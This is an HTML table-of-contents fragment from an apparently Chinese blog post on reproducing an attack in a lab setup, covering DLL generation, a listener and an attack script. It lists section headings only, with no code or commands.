class="nav-text">靶机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">2.2.</span> <span class="nav-text">复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生成DLL文件"><span class="nav-number">2.2.1.</span> <span class="nav-text">生成DLL文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置监听"><span class="nav-number">2.2.2.</span> <span class="nav-text">设置监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置攻击脚本"><span class="nav-number">2.2.3.</span> <span class="nav-text">配置攻击脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作监听机"><span class="nav-number">2.2.4.</span> <span class="nav-text">操作监听机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#之前的复现图"><span class="nav-number">2.3.</span> <span class="nav-text">之前的复现图</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结语"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
         </section>
